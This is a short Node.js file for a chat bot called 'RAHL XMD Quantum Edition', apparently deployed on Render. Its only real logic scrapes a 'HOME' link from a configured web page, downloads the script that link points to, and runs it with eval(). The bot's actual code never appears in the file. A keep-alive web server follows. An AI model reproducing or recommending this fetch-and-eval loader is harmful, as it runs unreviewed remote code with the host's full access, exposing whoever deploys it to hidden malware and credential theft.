//  [RAHL XMD QUANTUM EDITION]                                           
//  >> A convergence of dark royal intelligence and quantum logic
//  >> Forged by Lord Rahl                                                
//  >> Version: 9.0.0-quantum.rahl                                         

const axios = require('axios');
const cheerio = require('cheerio');
const express = require('express');
const rahl = require("./config");

async function fetchHomeUrl() {
  try {
    const response = await axios.get(rahl.RAHL_XMD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("HOME")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('⚠️ HOME link not found — the royal script cannot awaken.');
    }

    console.log('👑 The royal heart is loaded successfully.');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('❌ Error loading RAHL XMD core:', error.message);
  }
}

fetchHomeUrl();

// ===============================
// ⚡ Render Keep-Alive Server ⚡
// ===============================
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('👑 RAHL XMD Quantum Bot is alive and ruling the Render realm!');
});

app.listen(PORT, () => {
  console.log(`✅ Keep-alive server active on port ${PORT}`);
});
